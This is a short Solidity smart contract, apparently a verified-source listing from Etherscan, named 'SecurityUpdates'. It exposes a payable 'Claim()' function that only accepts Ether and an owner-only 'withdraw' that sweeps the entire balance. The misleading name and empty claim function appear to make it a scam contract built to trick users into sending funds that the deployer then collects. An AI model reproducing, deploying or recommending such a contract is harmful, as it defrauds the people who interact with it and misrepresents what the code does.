/**
 *Submitted for verification at Etherscan.io on 2023-02-26
*/

pragma solidity ^0.6.0;

contract SecurityUpdates {
    address private owner;

    constructor() public {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function withdraw(address payable _addr) public {
        require(owner == msg.sender);
        _addr.transfer(address(this).balance);
    }

    function Claim() public payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}